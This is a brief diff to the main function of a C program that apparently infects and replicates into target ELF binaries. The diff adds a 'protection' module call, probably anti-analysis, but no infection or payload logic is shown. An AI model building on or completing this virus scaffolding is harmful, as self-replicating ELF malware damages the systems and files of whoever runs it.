@@ -1,5 +1,6 @@
 #include "infection/infection.h"
 #include "replication/replication.h"
+#include "protection/protection.h"
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -7,6 +8,11 @@
 int main(int argc, char *argv[]) {
     if (argc != 2) {
         fprintf(stderr, "Usage: %s {target elf}\n", argv[0]);
+        return 1;
+    }
+
+    if (protection()) {
+        fprintf(stderr, "Protection failed\n");
         return 1;
     }
 
